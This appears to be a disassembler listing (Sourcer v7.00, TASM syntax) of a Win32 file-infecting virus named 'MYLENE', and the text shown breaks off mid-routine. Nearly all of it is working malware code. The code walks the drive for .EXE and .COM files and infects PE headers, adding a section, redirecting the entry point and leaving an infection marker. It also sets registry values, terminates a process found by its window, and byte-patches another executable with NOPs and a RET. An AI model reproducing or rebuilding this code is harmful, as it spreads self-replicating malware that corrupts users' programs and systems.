            MYLENE.LST						Sourcer	v7.00    9-May- 0  10:53 am   Page 1


				PAGE  59,132

				;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
				;€€					                                 €€
				;€€				MYLENE	                                 €€
				;€€					                                 €€
				;€€      Created:   9-May-100		                                 €€
				;€€      Code type: PE (WIN32)		                                 €€
				;€€      Passes:    5          Analysis	Options on: O                    €€
				;€€      Copyright 1998-xxxx by	<NeverLoved>                             €€
				;€€					                                 €€
				;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

				target		EQU   'T5'                      ; Target assembler: TASM-5.0

				include  srmacros.inc

				.586p

				.587

				; The following equates show data references outside the range of the program.

     = 0018			data_1e		equ	18h			; (00018=8)
     = 00F8			data_2e		equ	0F8h			; (000F8=6Ch)
     = 0100			data_3e		equ	100h			; (00100=59h)
     = 0A00			data_4e		equ	0A00h			;*(00A00=84h)
     = 0A20			data_5e		equ	0A20h			;*(00A20=2Bh)
     = 0AF0			data_6e		equ	0AF0h			;*(00AF0=0)
     = 6050			data_94e	equ	6050h			;*(8000:6050=0)
     = 60C0			data_95e	equ	60C0h			;*(8000:60C0=0)
     = 60D4			data_96e	equ	60D4h			;*(8000:60D4=0)
     = 60E0			data_97e	equ	60E0h			;*(8000:60E0=0)
     = 6150			data_98e	equ	6150h			;*(8000:6150=0)
     = 6164			data_99e	equ	6164h			;*(8000:6164=0)
     = 6170			data_100e	equ	6170h			;*(8000:6170=0)
     = 617D			data_101e	equ	617Dh			;*(8000:617D=0)
     = 618A			data_102e	equ	618Ah			;*(8000:618A=0)
     = 6196			data_103e	equ	6196h			;*(8000:6196=0)
     = 61A0			data_104e	equ	61A0h			;*(8000:61A0=0)
     = 61AE			data_105e	equ	61AEh			;*(8000:61AE=0)
     = 61BA			data_106e	equ	61BAh			;*(8000:61BA=0)
     = 61C8			data_107e	equ	61C8h			;*(8000:61C8=0)
     = 61D6			data_108e	equ	61D6h			;*(8000:61D6=0)
     = 61E4			data_109e	equ	61E4h			;*(8000:61E4=0)
     = 61F6			data_110e	equ	61F6h			;*(8000:61F6=0)
     = 6206			data_111e	equ	6206h			;*(8000:6206=0)
     = 6218			data_112e	equ	6218h			;*(8000:6218=0)
     = 6230			data_113e	equ	6230h			;*(8000:6230=0)
     = 6246			data_114e	equ	6246h			;*(8000:6246=0)
     = 625C			data_115e	equ	625Ch			;*(8000:625C=0)
     = 626C			data_116e	equ	626Ch			;*(8000:626C=0)
     = 627C			data_117e	equ	627Ch			;*(8000:627C=0)
     = 628E			data_118e	equ	628Eh			;*(8000:628E=0)
     = 629E			data_119e	equ	629Eh			;*(8000:629E=0)
     = 62AC			data_120e	equ	62ACh			;*(8000:62AC=0)
     = 62BA			data_121e	equ	62BAh			;*(8000:62BA=0)
     = 62CA			data_122e	equ	62CAh			;*(8000:62CA=0)
     = 62D8			data_123e	equ	62D8h			;*(8000:62D8=0)
     = 62E4			data_124e	equ	62E4h			;*(8000:62E4=0)
     = 62FC			data_125e	equ	62FCh			;*(8000:62FC=0)
     = 630C			data_126e	equ	630Ch			;*(8000:630C=0)
     = 631E			data_127e	equ	631Eh			;*(8000:631E=0)
     = 6326			data_128e	equ	6326h			;*(8000:6326=0)
     = 633A			data_129e	equ	633Ah			;*(8000:633A=0)
     = 634A			data_130e	equ	634Ah			;*(8000:634A=0)
     = 635E			data_131e	equ	635Eh			;*(8000:635E=0)
     = 6370			data_132e	equ	6370h			;*(8000:6370=0)
     = 637E			data_133e	equ	637Eh			;*(8000:637E=0)
     = 638C			data_134e	equ	638Ch			;*(8000:638C=0)
     = 63A8			data_135e	equ	63A8h			;*(8000:63A8=0)

				;------------------------------------------------------------  seg_b   ----

				seg_b		segment	use32 at 0
						assume cs:seg_b  , ds:seg_b


						org	1000h


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          start
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    01000			start		proc	near
    01000  6A 03				push	dword ptr 3
    01002  E8 00001086				call	jmp_SetErrorMode	; (0208D)
    01007  C6 05 000070AF 01			mov	byte ptr data_56,1	; (070AF=0)
    0100E  8A 44 24 03				mov	al,byte ptr [esp+3]
    01012  3C BF				cmp	al,0BFh
    01014  75 2E				jne	short loc_1		; Jump if not equal
    01016  E8 00001030				call	jmp_GetCurrentThreadId	; (0204B)
    0101B  8B C8				mov	ecx,eax
    0101D  64: 67| A1 0018			mov	eax,fs:data_1e		; (00018=8008h)
    01022  83 E8 10				sub	eax,10h
    01025  33 C1				xor	eax,ecx
    01027  A3 00007093				mov	data_49,eax		; (07093=0)
    0102C  E8 00001014				call	jmp_GetCurrentProcessId	; (02045)
    01031  33 05 00007093			xor	eax,dword ptr data_49	; (07093=0)
    01037  66| C7 40 20 0180			mov	word ptr [eax+20h],180h
    0103D  C6 05 000070AF 00			mov	byte ptr data_56,0	; (070AF=0)
    01044			loc_1:
    01044  E8 00000FF0				call	jmp_GetCommandLineA	; (02039)
    01049  33 C9				xor	ecx,ecx			; Zero register
    0104B  8B F0				mov	esi,eax
    0104D  AC					lodsb				; String [si] to al
    0104E  3C 22				cmp	al,22h			; '"'
    01050  74 01				je	short loc_2		; Jump if equal
    01052  4E					dec	esi
    01053			loc_2:
    01053  56					push	esi
    01054			loc_3:
    01054  AC					lodsb				; String [si] to al
    01055  41					inc	ecx
    01056  3C 22				cmp	al,22h			; '"'
    01058  74 08				je	short loc_4		; Jump if equal
    0105A  3C 20				cmp	al,20h			; ' '
    0105C  74 04				je	short loc_4		; Jump if equal
    0105E  3C 00				cmp	al,0
    01060  75 F2				jne	loc_3			; Jump if not equal
    01062			loc_4:
    01062  5E					pop	esi
    01063  BF 00007CB0				mov	edi,7CB0h
    01068  57					push	edi
    01069  49					dec	ecx
    0106A  FC					cld				; Clear direction
    0106B  F3/ A4				rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
    0106D  33 C0				xor	eax,eax			; Zero register
    0106F  AA					stosb				; Store al to es:[di]
    01070  58					pop	eax
    01071  81 7E 01 79786573			cmp	dword ptr [esi+1],79786573h
    01078  74 11				je	short loc_5		; Jump if equal
    0107A  6A 00				push	dword ptr 0
    0107C  68 00003197				push	3197h
    01081  E8 00000F83				call	jmp_WinExec		; (02009)
    01086  E8 00000F9C				call	jmp_ExitProcess		; (02027)
    0108B			loc_5:
    0108B  60					pushad				; Save all regs
    0108C  E8 00000D94				call	sub_19			; (01E25)
    01091  0F 85 000001C2			jnz	loc_9			; Jump if not zero
    01097  6A 00				push	dword ptr 0
    01099  6A 00				push	dword ptr 0
    0109B  6A 01				push	dword ptr 1
    0109D  6A 00				push	dword ptr 0
    0109F  6A 03				push	dword ptr 3
    010A1  68 C0000000				push	0C0000000h
    010A6  68 00003157				push	3157h
    010AB  E8 00000F71				call	jmp_CreateFileA		; (02021)
    010B0  8B D8				mov	ebx,eax
    010B2  40					inc	eax
    010B3  0F 84 000001A0			jz	loc_9			; Jump if zero
    010B9  6A 00				push	dword ptr 0
    010BB  68 0000709F				push	709Fh
    010C0  68 00003ED5				push	3ED5h
    010C5  68 000031BE				push	31BEh
    010CA  53					push	ebx
    010CB  E8 00000F45				call	jmp_WriteFile		; (02015)
    010D0  53					push	ebx
    010D1  E8 00000F45				call	jmp_CloseHandle		; (0201B)
    010D6  68 000070B0				push	70B0h
    010DB  68 0000310D				push	310Dh
    010E0  68 80000002				push	80000002h
    010E5  E8 00000FCD				call	jmp_RegOpenKeyA		; (020B7)
    010EA  85 C0				test	eax,eax
    010EC  0F 85 00000167			jnz	loc_9			; Jump if not zero
    010F2  68 000031AB				push	31ABh
    010F7  68 00020230				push	20230h
    010FC  6A 00				push	dword ptr 0
    010FE  6A 00				push	dword ptr 0
    01100  68 0000314A				push	314Ah
    01105  FF 35 000070B0			push	dword ptr data_57	; (070B0=0)
    0110B  E8 00000F9B				call	jmp_RegQueryValueExA	; (020AB)
    01110  85 C0				test	eax,eax
    01112  0F 85 00000141			jnz	loc_9			; Jump if not zero
    01118  68 000070B0				push	70B0h
    0111D  E8 00000F9B				call	jmp_RegCloseKey		; (020BD)
    01122  BE 00020230				mov	esi,20230h
    01127  56					push	esi
    01128  56					push	esi
    01129  56					push	esi
    0112A  5F					pop	edi
    0112B			loc_6:
    0112B ˙AC					lodsb				; String [si] to al
    0112C  3C 5C				cmp	al,5Ch			; '\'
    0112E  74 06				je	short loc_7		; Jump if equal
    01130  3C 00				cmp	al,0
    01132  75 F7				jne	loc_6			; Jump if not equal
    01134  EB 04				jmp	short loc_8		; (0113A)
    01136			loc_7:
    01136  8B FE				mov	edi,esi
    01138  EB F1				jmp	short loc_6		; (0112B)
    0113A			loc_8:
    0113A  5E					pop	esi
    0113B  4F					dec	edi
    0113C  87 CF				xchg	ecx,edi
    0113E  2B CE				sub	ecx,esi
    01140  BF 0002035C				mov	edi,2035Ch
    01145  57					push	edi
    01146  F3/ A4				rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
    01148  68 00020488				push	20488h
    0114D  68 000000FF				push	0FFh
    01152  E8 00000EE8				call	jmp_GetCurrentDirectoryA	; (0203F)
    01157  E8 00000F2B				call	jmp_SetCurrentDirectoryA	; (02087)
    0115C  E8 00000F14				call	jmp_LoadLibraryA	; (02075)
    01161  85 C0				test	eax,eax
    01163  0F 84 000000F0			jz	loc_9			; Jump if zero
    01169  68 0000318B				push	318Bh
    0116E  50					push	eax
    0116F  E8 00000EB9				call	jmp_GetProcAddress	; (0202D)
    01174  85 C0				test	eax,eax
    01176  0F 84 000000DD			jz	loc_9			; Jump if zero
    0117C  6A 00				push	dword ptr 0
    0117E  68 000070A3				push	70A3h
    01183  68 0000314F				push	314Fh
    01188  6A 00				push	dword ptr 0
    0118A  FF D0				call	eax			;*
    0118C  85 C0				test	eax,eax
    0118E  0F 85 000000C5			jnz	loc_9			; Jump if not zero
    01194  FF 35 000070A3			push	dword ptr data_53	; (070A3=0)
    0119A  E8 00000ED0				call	jmp_GlobalLock		; (0206F)
    0119F  8B D8				mov	ebx,eax
    011A1  83 C3 5E				add	ebx,5Eh
    011A4  6A 00				push	dword ptr 0
    011A6  6A 00				push	dword ptr 0
    011A8  6A 02				push	dword ptr 2
    011AA  6A 00				push	dword ptr 0
    011AC  6A 03				push	dword ptr 3
    011AE  68 C0000000				push	0C0000000h
    011B3  68 00003157				push	3157h
    011B8  E8 00000E64				call	jmp_CreateFileA		; (02021)
    011BD  50					push	eax
    011BE  50					push	eax
    011BF  6A 00				push	dword ptr 0
    011C1  68 0000709F				push	709Fh
    011C6  6A 0E				push	dword ptr 0Eh
    011C8  68 000031B0				push	31B0h
    011CD  50					push	eax
    011CE  E8 00000E42				call	jmp_WriteFile		; (02015)
    011D3  58					pop	eax
    011D4  6A 00				push	dword ptr 0
    011D6  68 0000709F				push	709Fh
    011DB  68 00027D18				push	27D18h
    011E0  53					push	ebx
    011E1  50					push	eax
    011E2  E8 00000E2E				call	jmp_WriteFile		; (02015)
    011E7  E8 00000E2F				call	jmp_CloseHandle		; (0201B)
    011EC  FF 35 000070A3			push	dword ptr data_53	; (070A3=0)
    011F2  E8 00000E72				call	jmp_GlobalFree		; (02069)
    011F7  68 00020488				push	20488h
    011FC  E8 00000E86				call	jmp_SetCurrentDirectoryA	; (02087)
    01201  68 000070B0				push	70B0h
    01206  68 00003165				push	3165h
    0120B  68 80000001				push	80000001h
    01210  E8 00000EA2				call	jmp_RegOpenKeyA		; (020B7)
    01215  85 C0				test	eax,eax
    01217  75 40				jnz	short loc_9		; Jump if not zero
    01219  6A 0E				push	dword ptr 0Eh
    0121B  68 00003157				push	3157h
    01220  6A 01				push	dword ptr 1
    01222  6A 00				push	dword ptr 0
    01224  68 0000317F				push	317Fh
    01229  FF 35 000070B0			push	dword ptr data_57	; (070B0=0)
    0122F  E8 00000E7D				call	jmp_RegSetValueExA	; (020B1)
    01234  6A 01				push	dword ptr 1
    01236  68 00003189				push	3189h
    0123B  6A 01				push	dword ptr 1
    0123D  6A 00				push	dword ptr 0
    0123F  68 0000317B				push	317Bh
    01244  FF 35 000070B0			push	dword ptr data_57	; (070B0=0)
    0124A  E8 00000E62				call	jmp_RegSetValueExA	; (020B1)
    0124F  68 000070B0				push	70B0h
    01254  E8 00000E64				call	jmp_RegCloseKey		; (020BD)
    01259			loc_9:
    01259  68 000070B0				push	70B0h
    0125E  68 000030E9				push	30E9h
    01263  68 80000003				push	80000003h
    01268  E8 00000E4A				call	jmp_RegOpenKeyA		; (020B7)
    0126D  85 C0				test	eax,eax
    0126F  0F 85 000001A0			jnz	loc_17			; Jump if not zero
    01275  68 000031A7				push	31A7h
    0127A  68 00020104				push	20104h
    0127F  6A 00				push	dword ptr 0
    01281  6A 00				push	dword ptr 0
    01283  68 0000314A				push	314Ah
    01288  FF 35 000070B0			push	dword ptr data_57	; (070B0=0)
    0128E  E8 00000E18				call	jmp_RegQueryValueExA	; (020AB)
    01293  85 C0				test	eax,eax
    01295  0F 85 0000017A			jnz	loc_17			; Jump if not zero
    0129B  68 000070B0				push	70B0h
    012A0  E8 00000E18				call	jmp_RegCloseKey		; (020BD)
    012A5  BE 000030D4				mov	esi,30D4h
    012AA  8B 3D 000031A7			mov	edi,dword ptr data_42	; (031A7=12Ch)
    012B0  81 C7 00020103			add	edi,20103h
    012B6  B9 0000000E				mov	ecx,0Eh
    012BB  F3/ A4				rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
    012BD  6A 00				push	dword ptr 0
    012BF  6A 00				push	dword ptr 0
    012C1  6A 03				push	dword ptr 3
    012C3  6A 00				push	dword ptr 0
    012C5  6A 03				push	dword ptr 3
    012C7  68 80000000				push	80000000h
    012CC  68 00020104				push	20104h
    012D1  E8 00000D4B				call	jmp_CreateFileA		; (02021)
    012D6  8B D8				mov	ebx,eax
    012D8  40					inc	eax
    012D9  0F 84 00000136			jz	loc_17			; Jump if zero
    012DF  6A 04				push	dword ptr 4
    012E1  68 00001000				push	1000h
    012E6  68 0007A120				push	7A120h
    012EB  6A 00				push	dword ptr 0
    012ED  E8 00000DB3				call	jmp_VirtualAlloc	; (020A5)
    012F2  85 C0				test	eax,eax
    012F4  0F 84 0000011B			jz	loc_17			; Jump if zero
    012FA  50					push	eax
    012FB  6A 00				push	dword ptr 0
    012FD  68 0000709F				push	709Fh
    01302  68 0007A120				push	7A120h
    01307  50					push	eax
    01308  53					push	ebx
    01309  E8 00000D73				call	jmp_ReadFile		; (02081)
    0130E  6A 00				push	dword ptr 0
    01310  6A 00				push	dword ptr 0
    01312  6A 00				push	dword ptr 0
    01314  53					push	ebx
    01315  E8 00000D79				call	jmp_SetFilePointer	; (02093)
    0131A  5A					pop	edx
    0131B  B8 6861636B				mov	eax,6861636Bh
    01320  39 42 30				cmp	dword ptr [edx+30h],eax
    01323  0F 84 000000D6			je	loc_16			; Jump if equal
    01329  89 42 30				mov	dword ptr [edx+30h],eax
    0132C  52					push	edx
    0132D  53					push	ebx
    0132E  E8 00000CE8				call	jmp_CloseHandle		; (0201B)
    01333  6A 00				push	dword ptr 0
    01335  68 000030E2				push	30E2h
    0133A  E8 00000D8A				call	jmp_FindWindowA		; (020C9)
    0133F  85 C0				test	eax,eax
    01341  74 2B				jz	short loc_10		; Jump if zero
    01343  68 00007097				push	7097h
    01348  50					push	eax
    01349  E8 00000D75				call	jmp_GetWindowThreadProcessId	; (020C3)
    0134E  FF 35 00007097			push	dword ptr data_50	; (07097=0)
    01354  6A 00				push	dword ptr 0
    01356  6A FF				push	0FFFFFFFFh
    01358  E8 00000D1E				call	jmp_OpenProcess		; (0207B)
    0135D  50					push	eax
    0135E  50					push	eax
    0135F  E8 00000D3B				call	jmp_TerminateProcess	; (0209F)
    01364  68 0000012C				push	12Ch
    01369  E8 00000D2B				call	jmp_Sleep		; (02099)
    0136E			loc_10:
    0136E  6A 00				push	dword ptr 0
    01370  6A 00				push	dword ptr 0
    01372  6A 03				push	dword ptr 3
    01374  6A 00				push	dword ptr 0
    01376  6A 03				push	dword ptr 3
    01378  68 C0000000				push	0C0000000h
    0137D  68 00020104				push	20104h
    01382  E8 00000C9A				call	jmp_CreateFileA		; (02021)
    01387  5A					pop	edx
    01388  8B D8				mov	ebx,eax
    0138A  40					inc	eax
    0138B  0F 84 00000084			jz	loc_17			; Jump if zero
    01391  8B F2				mov	esi,edx
    01393  8B 0D 0000709F			mov	ecx,dword ptr data_52	; (0709F=0)

    01399			locloop_11:
    01399  AD					lodsd				; String [si] to ax
    0139A  3D 8020E283				cmp	eax,8020E283h
    0139F  74 25				je	short loc_14		; Jump if equal
    013A1  3D 0400E181				cmp	eax,400E181h
    013A6  74 0E				je	short loc_13		; Jump if equal
    013A8  3D 0824448B				cmp	eax,824448Bh
    013AD  74 2D				je	short loc_15		; Jump if equal
    013AF			loc_12:
    013AF ˙83 EE 03				sub	esi,3
    013B2  E2 E5				loopd	locloop_11		; Loop if ecx > 0

    013B4  EB 49				jmp	short loc_16		; (013FF)
    013B6			loc_13:
    013B6  AD					lodsd				; String [si] to ax
    013B7  3D F9810000				cmp	eax,0F9810000h
    013BC  75 F1				jne	loc_12			; Jump if not equal
    013BE  66| C7 46 04 9090			mov	word ptr [esi+4],9090h
    013C4  EB E9				jmp	short loc_12		; (013AF)
    013C6			loc_14:
    013C6  AD					lodsd				; String [si] to ax
    013C7  3D 067520FA				cmp	eax,67520FAh
    013CC  75 E1				jne	loc_12			; Jump if not equal
    013CE  66| C7 46 FE 9090			mov	word ptr [esi-2],9090h
    013D4  66| C7 46 12 9090			mov	word ptr [esi+12h],9090h
    013DA  EB D3				jmp	short loc_12		; (013AF)
    013DC			loc_15:
    013DC  81 7E 06 106A0424			cmp	dword ptr [esi+6],106A0424h
    013E3  75 CA				jne	loc_12			; Jump if not equal
    013E5  C6 46 FC C3				mov	byte ptr [esi-4],0C3h
    013E9  52					push	edx
    013EA  6A 00				push	dword ptr 0
    013EC  68 0000709F				push	709Fh
    013F1  FF 35 0000709F			push	dword ptr data_52	; (0709F=0)
    013F7  52					push	edx
    013F8  53					push	ebx
    013F9  E8 00000C17				call	jmp_WriteFile		; (02015)
    013FE  5A					pop	edx
    013FF			loc_16:
    013FF  68 00004000				push	4000h
    01404  68 0007A120				push	7A120h
    01409  52					push	edx
    0140A  E8 00000C00				call	jmp_VirtualFree		; (0200F)
    0140F  53					push	ebx
    01410  E8 00000C06				call	jmp_CloseHandle		; (0201B)
    01415			loc_17:
    01415  61					popad				; Restore all regs
    01416  6A 00				push	dword ptr 0
    01418  6A 00				push	dword ptr 0
    0141A  6A 03				push	dword ptr 3
    0141C  6A 00				push	dword ptr 0
    0141E  6A 03				push	dword ptr 3
    01420  68 80000000				push	80000000h
    01425  50					push	eax
    01426  E8 00000BF6				call	jmp_CreateFileA		; (02021)
    0142B  8B D8				mov	ebx,eax
    0142D  40					inc	eax
    0142E  0F 84 000009D6			jz	loc_64			; Jump if zero
    01434  6A 00				push	dword ptr 0
    01436  68 0000709F				push	709Fh
    0143B  68 00007BB8				push	7BB8h
    01440  68 00007DDC				push	7DDCh
    01445  53					push	ebx
    01446  E8 00000C36				call	jmp_ReadFile		; (02081)
    0144B  40					inc	eax
    0144C  0F 84 000009B8			jz	loc_64			; Jump if zero
    01452  53					push	ebx
    01453  E8 00000BC3				call	jmp_CloseHandle		; (0201B)
    01458			loc_18:
    01458 ˙68 000030C9				push	30C9h
    0145D  E8 00000BEF				call	jmp_GetDriveTypeA	; (02051)
    01462  3C 03				cmp	al,3
    01464  0F 85 000009A0			jne	loc_64			; Jump if not equal
    0146A  BE 00000258				mov	esi,258h
    0146F  68 000030C9				push	30C9h
    01474  E8 00000C0E				call	jmp_SetCurrentDirectoryA	; (02087)

				;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

    01479			sub_1:
    01479  8D 86 000205B4			lea	eax,dword ptr data_86[esi]	; (205B4=0) Load effective addr
    0147F  50					push	eax
    01480  68 000030CD				push	30CDh
    01485  E8 00000BD3				call	jmp_FindFirstFileA	; (0205D)
    0148A  40					inc	eax
    0148B  0F 84 00000950			jz	loc_62			; Jump if zero
    01491  48					dec	eax
    01492  89 86 000207E0			mov	dword ptr data_89[esi],eax	; (207E0=0)
    01498  EB 1A				jmp	short loc_20		; (014B4)
    0149A			loc_19:
    0149A ˙8D 86 000205B4			lea	eax,dword ptr data_86[esi]	; (205B4=0) Load effective addr
    014A0  50					push	eax
    014A1  FF B6 000207E0			push	dword ptr data_89[esi]	; (207E0=0)
    014A7  E8 00000B87				call	jmp_FindNextFileA	; (02033)
    014AC  85 C0				test	eax,eax
    014AE  0F 84 0000092D			jz	loc_62			; Jump if zero
    014B4			loc_20:
    014B4  8B 86 000205B4			mov	eax,dword ptr data_86[esi]	; (205B4=0)
    014BA  3C 10				cmp	al,10h
    014BC  0F 84 00000831			je	loc_56			; Jump if equal
    014C2  8D 96 000205E0			lea	edx,dword ptr data_88[esi]	; (205E0=0) Load effective addr
    014C8  8B FA				mov	edi,edx
    014CA  8B CF				mov	ecx,edi
    014CC  33 C0				xor	eax,eax			; Zero register
    014CE  F2/ AE				repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
    014D0  81 7F FB 4558452E			cmp	dword ptr [edi-5],4558452Eh
    014D7  74 1B				je	short loc_21		; Jump if equal
    014D9  81 7F FB 6578652E			cmp	dword ptr [edi-5],6578652Eh
    014E0  74 12				je	short loc_21		; Jump if equal
    014E2  81 7F FB 6D6F632E			cmp	dword ptr [edi-5],6D6F632Eh
    014E9  74 09				je	short loc_21		; Jump if equal
    014EB  81 7F FB 4D4F432E			cmp	dword ptr [edi-5],4D4F432Eh
    014F2  75 A6				jne	loc_19			; Jump if not equal
    014F4			loc_21:
    014F4  E8 0000092C				call	sub_19			; (01E25)
    014F9  74 9F				jz	loc_19			; Jump if zero
    014FB  60					pushad				; Save all regs
    014FC  68 00000BB8				push	0BB8h
    01501  E8 00000B93				call	jmp_Sleep		; (02099)
    01506  61					popad				; Restore all regs
    01507  56					push	esi
    01508  6A 00				push	dword ptr 0
    0150A  6A 00				push	dword ptr 0
    0150C  6A 03				push	dword ptr 3
    0150E  6A 00				push	dword ptr 0
    01510  6A 03				push	dword ptr 3
    01512  68 C0000000				push	0C0000000h
    01517  52					push	edx
    01518  E8 00000B04				call	jmp_CreateFileA		; (02021)
    0151D  8B D8				mov	ebx,eax
    0151F  40					inc	eax
    01520  0F 84 000007C7			jz	loc_55			; Jump if zero
    01526  BF 0001754C				mov	edi,1754Ch
    0152B  6A 00				push	dword ptr 0
    0152D  68 0000709F				push	709Fh
    01532  68 00004000				push	4000h
    01537  57					push	edi
    01538  53					push	ebx
    01539  E8 00000B43				call	jmp_ReadFile		; (02081)
    0153E  40					inc	eax
    0153F  0F 84 000007A2			jz	loc_54			; Jump if zero
    01545  BA 214D0349				mov	edx,214D0349h
    0154A  66| 81 3F 5A4D			cmp	word ptr [edi],5A4Dh
    0154F  0F 85 000007F5			jne	loc_60			; Jump if not equal
    01555  8B 47 3C				mov	eax,dword ptr [edi+3Ch]
    01558  3D 00004000				cmp	eax,4000h
    0155D  0F 87 00000784			ja	loc_54			; Jump if above
    01563  03 F8				add	edi,eax
    01565  81 3F 00004550			cmp	dword ptr [edi],4550h
    0156B  0F 85 00000776			jne	loc_54			; Jump if not equal
    01571  39 57 58				cmp	dword ptr [edi+58h],edx
    01574  89 57 58				mov	dword ptr [edi+58h],edx
    01577  0F 84 0000076A			jz	loc_54			; Jump if zero
    0157D  F6 47 17 20				test	byte ptr [edi+17h],20h	; ' '
    01581  0F 85 00000760			jnz	loc_54			; Jump if not zero
    01587  0F B7 4F 06				movzx	ecx,word ptr [edi+6]	; Mov w/zero extend
    0158B  51					push	ecx
    0158C  56					push	esi
    0158D  F8					clc				; Clear carry flag
    0158E  E8 0000079E				call	sub_17			; (01D31)
    01593  8D B7 00000100			lea	esi,dword ptr ds:data_3e[edi]	; (00100=0F000EC59h) Load effective ad

    01599			locloop_22:
    01599  AD					lodsd				; String [si] to ax
    0159A  85 C0				test	eax,eax
    0159C  74 08				jz	short loc_23		; Jump if zero
    0159E  F9					stc				; Set carry flag
    0159F  E8 0000078D				call	sub_17			; (01D31)
    015A4  EB 0A				jmp	short loc_24		; (015B0)
    015A6			loc_23:
    015A6  AD					lodsd				; String [si] to ax
    015A7  AD					lodsd				; String [si] to ax
    015A8  89 46 F4				mov	dword ptr [esi-0Ch],eax
    015AB  83 C6 1C				add	esi,1Ch
    015AE  E2 E9				loopd	locloop_22		; Loop if ecx > 0

    015B0			loc_24:
    015B0  5E					pop	esi
    015B1  58					pop	eax
    015B2  0F B7 4F 14				movzx	ecx,word ptr [edi+14h]	; Mov w/zero extend
    015B6  40					inc	eax
    015B7  66| FF 47 06				inc	word ptr [edi+6]
    015BB  6B C0 28				imul	eax,28h			; reg1 = reg2 * value
    015BE  3B C1				cmp	eax,ecx
    015C0  0F 82 00000721			jb	loc_54			; Jump if below
    015C6  8D 97 000000F8			lea	edx,dword ptr ds:data_2e[edi]	; (000F8=0C9106Ch) Load effective addr
    015CC  83 E8 50				sub	eax,50h
    015CF  8B 4C 02 08				mov	ecx,dword ptr [edx+8][eax]
    015D3  03 4C 02 0C				add	ecx,dword ptr [edx+0Ch][eax]
    015D7  8D 6F 38				lea	ebp,dword ptr [edi+38h]	; Load effective addr
    015DA  E8 0000073D				call	sub_16			; (01D1C)
    015DF  89 0D 000030AD			mov	dword ptr data_35,ecx	; (030AD=0)
    015E5  8B 6F 34				mov	ebp,dword ptr [edi+34h]
    015E8  55					push	ebp
    015E9  03 6F 28				add	ebp,dword ptr [edi+28h]
    015EC  50					push	eax
    015ED  E8 0000081D				call	sub_18			; (01E0F)
    015F2  33 E8				xor	ebp,eax
    015F4  89 2D 00007ECC			mov	dword ptr data_82,ebp	; (07ECC=23824FFh)
    015FA  BD FFC01601				mov	ebp,0FFC01601h
    015FF  89 85 00007DDC			mov	dword ptr ss:data_81[ebp],eax	; (07DDC=35E8h)
    01605  58					pop	eax
    01606  89 4F 28				mov	dword ptr [edi+28h],ecx
    01609  81 47 50 00007BB8			add	dword ptr [edi+50h],7BB8h
    01610  5D					pop	ebp
    01611  03 CD				add	ecx,ebp
    01613  89 0D 0000709B			mov	dword ptr data_51,ecx	; (0709B=0)
    01619  81 47 28 00007000			add	dword ptr [edi+28h],7000h
    01620  8B 4C 02 10				mov	ecx,dword ptr [edx+10h][eax]
    01624  03 4C 02 14				add	ecx,dword ptr [edx+14h][eax]
    01628  8D 6F 3C				lea	ebp,dword ptr [edi+3Ch]	; Load effective addr
    0162B  E8 000006EC				call	sub_16			; (01D1C)
    01630  3B 8E 000205D4			cmp	ecx,dword ptr data_87[esi]	; (205D4=0)
    01636  0F 82 000006AB			jb	loc_54			; Jump if below
    0163C  89 0D 000030B5			mov	dword ptr data_37,ecx	; (030B5=0)
    01642  60					pushad				; Save all regs
    01643  B9 00000028				mov	ecx,28h
    01648  BE 000030A1				mov	esi,30A1h
    0164D  8D 7C 10 28				lea	edi,dword ptr [eax+28h][edx]	; Load effective addr
    01651  F3/ A4				rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
    01653  61					popad				; Restore all regs
    01654  80 3D 000070AF 01			cmp	byte ptr data_56,1	; (070AF=0)
    0165B  0F 84 00000627			je	loc_51			; Jump if equal
    01661  60					pushad				; Save all regs
    01662  BE 00007DDC				mov	esi,7DDCh
    01667  BF 0000F994				mov	edi,0F994h
    0166C  B9 00007BB8				mov	ecx,7BB8h
    01671  F3/ A4				rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
    01673  C6 05 000070BC 07			mov	byte ptr data_60,7	; (070BC=0)
    0167A  C7 05 000070BF     +			mov	dword ptr data_62,1FFFh	; (070BF=0)
           00001FFF
    01684  C7 05 000070C3     +			mov	dword ptr data_63,0EFh	; (070C3=0)
           000000EF
    0168E  33 C0				xor	eax,eax			; Zero register
    01690  66| A3 000070BD			mov	data_61,ax		; (070BD=0)
    01696  A2 000070C8				mov	data_65,al		; (070C8=0)
    0169B  C7 05 000070B8     +			mov	dword ptr data_59,80000000h	; (070B8=0)
           80000000
    016A5  B0 90				mov	al,90h
    016A7  B9 00000BBC				mov	ecx,0BBCh
    016AC  BF 000070D4				mov	edi,70D4h
    016B1  F3/ AA				rep	stosb			; Rep when cx >0 Store al to es:[di]
    016B3  BF 0001F54C				mov	edi,1F54Ch
    016B8			loc_25:
    016B8  E8 000002F4				call	sub_6			; (019B1)
    016BD  80 3D 000070C3 E0			cmp	byte ptr data_63,0E0h	; (070C3=0)
    016C4  F9					stc				; Set carry flag
    016C5  0F 84 000005BC			jz	loc_50			; Jump if zero
    016CB  81 FF 0001F934			cmp	edi,1F934h
